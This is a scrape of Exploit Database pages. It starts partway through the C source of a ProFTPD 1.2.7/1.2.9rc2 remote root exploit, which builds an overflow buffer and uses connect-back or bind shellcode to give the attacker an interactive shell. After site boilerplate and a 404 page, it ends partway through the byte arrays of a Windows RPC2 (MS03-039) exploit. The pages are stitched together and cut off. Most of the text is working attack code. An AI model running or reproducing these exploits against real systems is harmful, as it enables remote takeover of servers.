quit();//if(client_connect(sockfd1,HOST,port)<0) quit();i=sizeof(client);sockfd2=accept(sockfd1,(struct sockaddr *)&client,&i);printf("[+] Accepted a client from %s\n",inet_ntoa(client.sin_addr));sendbuf(sockfd2,s,len);close(sockfd2);close(sockfd1);}void setport(char *l,int pt1){int a,i,b,c,j;char buf[30];memset(buf,0,30);i=sprintf(buf,"%s",l);for(a=0;a<i;a++)if(buf[a]=='.') buf[a]=',';memset(cmdbuf,0,SIZE);b=(pt1 >> 8 ) & 0xff;c=pt1 & 0xff;j=sprintf(cmdbuf,"%s %s,%d,%d\r\n",portstr,buf,b,c);printf("[+] %s",cmdbuf);sendbuf(sockfd,cmdbuf,j);readbuf(NULL,sockfd,srvbuf,SIZE);checkstatus(srvbuf);}int dealpasv(char *s){int a,b,c,d,e,f,g;char *p1,*p2,*p3;int i;p1=(char *)malloc(100);if(!s)quit();p2=strchr(s,'(');//printf("p2:%s\n",p2);p3=strchr(s,')');//printf("p3:%s\n",p3);p3++;i=p3-p2;memcpy(p1,p2,i);p1[i]='\0';//printf("p1:%s\n",p1);sscanf(p1,"(%d,%d,%d,%d,%d,%d)",&a,&b,&c,&d,&e,&f);//printf("a:%d,b:%d,c:%d,d:%d,e:%d,f:%d\n",a,b,c,d,e,f);g=(e<<8) | f;//printf("port:%d\n",g);free(p1);return g;}void quit(){if(sockfd>0)close(sockfd);if(sockfd1>0)close(sockfd);if(sockfd2>0)close(sockfd);exit(0);}int sendbuf(int socket,char *buffer,int len){int j;j=send(socket,buffer,len,0);if(j==0){printf("[-] server closed the socket\n");quit();}if(j<0){perror("[-] Send data error");quit();}return j;}int readbuf(char *s,int socket,char *buffer,int len){int a,b,i,j=0;a=b=i=0;memset(buffer,0,len);if(s){printf("[+] %s:",s);fflush(stdout);}//j=lseek(socket,0,2);//printf("j:%d\n",j);if(mustread==0){j=recv(socket,buffer,len-1,0);if(j==0){if(s)printf("FAILED\n");printf("[-] server closed the socket\n");quit();}if(j<0){if(s)printf("FAILED\n");perror("[-] read data error");quit();}if(s)printf("ok\n");buffer[len-1]='\0';if(show==1)printf("<== %s",buffer);}else{//ÎÒÃÇ²»ÓÃ¹ØÐÄ·µ»ØÒ»Ð©Ê²Ã´Êý¾Ýb=mustread-i;while(b>0){a=b>(len-1)?(len-1):b;i=recv(socket,buffer,a,0);if(i==0){if(s)printf("FAILED\n");printf("[-] server closed the socket\n");quit();}if(i<0){if(s)printf("FAILED\n");perror("[-] read data error");quit();}if(s)printf("ok\n");b-=i;j+=i;}//printf("j:%d,mustread:%d\n",j,mustread);if(j!=mustread){printf("read failed\n");quit();}}//show=0;mustread=0;return j;}int client_connect(int sockfd,char* server,int port){struct sockaddr_in cliaddr;struct hostent *host;if((host=gethostbyname(server))==NULL){printf("gethostbyname(%s) error\n",server);return(-1);}bzero(&cliaddr,sizeof(struct sockaddr));cliaddr.sin_family=AF_INET;cliaddr.sin_port=htons(port);cliaddr.sin_addr=*((struct in_addr *)host->h_addr);printf("[+] Trying %s:%d....",server,port);fflush(stdout);if(connect(sockfd,(struct sockaddr *)&cliaddr,sizeof(struct sockaddr))<0){printf("error:%s\r\n",strerror(errno));close(sockfd);return(-1);}printf("ok\r\n");return(0);}void checkstatus(char *s){if(s==NULL)quit();if(isdigit(*s)){if(s[0]=='5'){printf("[-] Server told:%s\n",s);quit();}elsereturn;}printf("[-] Server said:%s\n",s);quit();}void loginftp(char *user,char *pass){int j;show=1;readbuf("Get banner",sockfd,srvbuf,SIZE);show=0;memset(cmdbuf,0,SIZE);//USERj=sprintf(cmdbuf,"%s %s\r\n",usrstr,user);sendbuf(sockfd,cmdbuf,j);readbuf(NULL,sockfd,srvbuf,SIZE);checkstatus(srvbuf);//PASSmemset(cmdbuf,0,SIZE);j=sprintf(cmdbuf,"%s %s\r\n",passtr,pass);sendbuf(sockfd,cmdbuf,j);readbuf(NULL,sockfd,srvbuf,SIZE);checkstatus(srvbuf);printf("[+] User %s logged in\n",user);}int setpasv(){int j,port1;memset(cmdbuf,0,SIZE);j=sprintf(cmdbuf,"%s\r\n",pasvstr);sendbuf(sockfd,cmdbuf,j);readbuf("Set PASV",sockfd,srvbuf,SIZE);checkstatus(srvbuf);port1=dealpasv(srvbuf); //get the pasv portreturn port1;}void setascii(){int j;memset(cmdbuf,0,SIZE);j=sprintf(cmdbuf,"%s\r\n",ascistr);sendbuf(sockfd,cmdbuf,j);readbuf(NULL,sockfd,srvbuf,SIZE);checkstatus(srvbuf);}void storbuf(char *filename,char *buf,int size,int port){int j;printf("[+] STOR file %s\n",filename);memset(cmdbuf,0,SIZE);j=sprintf(cmdbuf,"%s %s\r\n",storstr,filename);sendbuf(sockfd,cmdbuf,j);storfile(buf,size,port);//check if the content is send overdreadbuf(NULL,sockfd,srvbuf,SIZE);checkstatus(srvbuf);}void retrbuf(char *filename,char *buffer,int length,int port1){int j;printf("[+] RETR file %s\n",filename);memset(cmdbuf,0,SIZE);j=sprintf(cmdbuf,"%s %s\r\n",retrstr,filename);sendbuf(sockfd,cmdbuf,j);retrfile(buffer,length,port1);readbuf(NULL,sockfd,srvbuf,SIZE);checkstatus(srvbuf);}int createbuffer(char *s,int len,int type,char *h){int i,a,total;char buf[41];unsigned int writeaddr=targets[type-1].ret;writeaddr-=4;if(checklf((void *)&writeaddr,4)<0){printf("[-] Sorry, the ret addr %p=%p-4 have '\\n' char.\n",writeaddr,writeaddr+4);quit();}a=i=0;memset(s,0,len);i+=3;*(unsigned int *)(s+i)=writeaddr+7*4;i+=4;*(unsigned int *)(s+i)=writeaddr-0x600;i+=4;*(unsigned int *)(s+i)=writeaddr-0x400;i+=4;*(unsigned int *)(s+i)=writeaddr-0x200;i+=4;*(unsigned int *)(s+i)=writeaddr-0x300;i+=4;*(unsigned int *)(s+i)=0x0;i+=4;*(unsigned int *)(s+i)=0x90900eeb;i+=4;*(unsigned int *)(s+i)=0x0;i+=4;*(unsigned int *)(s+i)=0x0;i+=4;*(unsigned int *)(s+i)=0x0;i+=4;//connectback shellcode,modified ip & portif(bindmethod==0){modify(cbshellcode,h,pt);memcpy(s+i,cbshellcode,strlen(cbshellcode));i+=strlen(cbshellcode);}else{modify(bindshellcode,NULL,pt);memcpy(s+i,bindshellcode,strlen(bindshellcode));i+=strlen(bindshellcode);}memset(s+i,'Z',512-i);memset(s+512,'\n',512);total=1024;memset(buf,0,41);i=0;memset(buf,'\n',20);i+=20;*(unsigned int *)(buf+i)=writeaddr;i+=4;*(unsigned int *)(buf+i)=writeaddr;i+=4;*(unsigned int *)(buf+i)=writeaddr+0x800; //here,the value must great than 0x600i+=4;*(unsigned int *)(buf+i)=writeaddr;i+=4;*(unsigned int *)(buf+i)=writeaddr;//showmem(buf,40);for(i=0;i<1024;i++){a=(i*40)+1024;memcpy(s+a,buf,40);total+=40;}return total;}int create_serv(int sfd,int port){struct sockaddr_in srvaddr;int on=1;bzero(&srvaddr,sizeof(struct sockaddr));srvaddr.sin_port=htons(port);srvaddr.sin_family=AF_INET;srvaddr.sin_addr.s_addr=htonl(INADDR_ANY);printf("[+] Listening on %d ....",port);fflush(stdout);setsockopt(sfd,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(on));  //so I can rebind the portif(bind(sfd,(struct sockaddr *)&srvaddr,sizeof(struct sockaddr))<0){printf("FAILED\n");perror("[-] Bind port error");return(-1);}if(listen(sfd,5)<0){printf("FAILED\n");perror("[-] Listen error");return(-1);}printf("ok\n");return(0);}void modify(char *s,char *h,int port3){int a,b,c,d;if(h!=NULL){sscanf(h,"%d.%d.%d.%d",&a,&b,&c,&d);a&=0xff;b&=0xff;c&=0xff;d&=0xff;if((char)a=='\n' || (char)b=='\n' || (char)c=='\n' || (char)d=='\n'){printf("[-] Sorry, the connect back ip:%s have '\\n' char\n",h);}s[OFFSET] = a & 0xff;s[OFFSET+1] = b & 0xff;s[OFFSET+2] = c & 0xff;s[OFFSET+3] = d & 0xff;a=port3 >> 8 & 0xff;b=port3 & 0xff;if((char)a=='\n' || (char)b=='\n'){printf("[-] Sorry, the connect back port:%d have '\\n' char\n",port3);quit();}s[OFFSET+6]=a;s[OFFSET+7]=b;}else{a=port3 >> 8 & 0xff;b=port3 & 0xff;if((char)a=='\n' || (char)b=='\n'){printf("[-] Sorry, the bind port:%d have '\\n' char\n",port3);quit();}s[OFF2]=a;s[OFF2+1]=b;}}void usage(char *s){unsigned int a;char *p;int d=strlen(s)+1;p=(char *)malloc(d);memset(p,0x20,d-1);p[d-1]=0;printf("@---------------------------------------------------------@\n");printf("# proftpd 1.2.7/1.2.9rc2 remote root exploit(01/10)-%s  #\n",VER);printf("@    by bkbll(bkbll_at_cnhonker.net,bkbll_at_tom.com      @\n");printf("-----------------------------------------------------------\n");printf("Usage:%s -d <host> -u <user> -p <pass> -t <type>\n",s);printf("      %s -l <local ip> -h <cbip> -o <cbport>\n",p);printf("Arguments:\n");printf("      -d target host ip/name\n");printf("      -u user name\n");printf("      -p user paasword\n");printf("      -l the ip of this machine u used\n");printf("      -h connect back ip\n");printf("      -o connect back port/bind port\n");printf("      -t target type [default:%d]\n",type);printf("      ------------------------------\n");for(a = 0; a < sizeof(targets)/sizeof(v); a++)printf("         %d [0x%.8x]: %s\n", a+1, targets[a].ret, targets[a].os);printf("\n");free(p);exit(0);}int execsh(int clifd){fd_set fds;int count;char buffer[SIZE];memset(buffer,0,SIZE);while(1){FD_ZERO(&fds);FD_SET(0, &fds);FD_SET(clifd, &fds);if (select(clifd+1, &fds, NULL, NULL, NULL) < 0){if (errno == EINTR) continue;break;}if (FD_ISSET(0, &fds)){count = read(0, buffer, SIZE);if (count <= 0) break;if (write(clifd, buffer, count) <= 0) break;memset(buffer,0,SIZE);}if (FD_ISSET(clifd, &fds)){count = read(clifd, buffer, SIZE);if (count <= 0) break;if (write(1, buffer, count) <= 0) break;memset(buffer,0,SIZE);}}}int checklf(void *sd,int len){char *a;int i=0;a=(char *)sd;for(i=0;i<len;i++)if(*(a+i)=='\n') //found itreturn -1;return 0;}// milw0rm.com [2003-10-04]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 108
404 Page Not Found | Exploit Database#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIED404Page Not FoundThe page you are looking for could not be found.HomeGHDBPapersShellcodesExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 109
Microsoft Windows - 'RPC2' Universal / Denial of Service (RPC3) (MS03-039) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - 'RPC2' Universal / Denial of Service (RPC3) (MS03-039)EDB-ID:109CVE:2003-0605EDB Verified:Author:anonymousType:remoteExploit:/Platform:WindowsDate:2003-10-09Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*  Windows RPC2 Universal Exploit (MS03-039) & Remote DoS (RPC3)  *//*                    Must be used with the associated shell                        *//*                                                                                                  *//*           This exploit works against unpatched systems (MS03-039)     *//*             And cause a Denial of Service on patched systems (rpc3)     */#include <stdio.h>#include <winsock2.h>#include <windows.h>#include <process.h>#include <string.h>#include <winbase.h>FILE *fp1;unsigned char bindstr[]={0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};unsigned char request1[]={0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x